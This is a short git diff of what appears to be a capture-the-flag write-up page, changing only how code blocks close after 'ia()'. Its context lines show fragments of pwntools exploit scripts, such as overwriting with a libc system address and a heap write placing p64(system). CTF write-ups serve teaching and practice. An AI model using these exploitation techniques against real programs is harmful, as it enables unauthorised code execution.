@@ -54,9 +54,7 @@ system = libc_base + 0xebcf8
 # sla('Can you guess the pitcher\'s selection', (pitches[libc.rand() % 26]) * 16)
 sla('Can you guess the pitcher\'s selection', p64(system) * 100)
 
-ia()
-
-```
+ia()```
 {% endraw %}
 
 
@@ -148,9 +146,7 @@ sla('Enter:', 'done')
 rl()
 success(rl())
 
-ia()
-
-```
+ia()```
 {% endraw %}
 
 
@@ -374,9 +370,7 @@ add(17, p64(heap_fd+0x78) + p64(system))
 
 sl(str(0))
 
-ia()
-
-```
+ia()```
 {% endraw %}
 
 
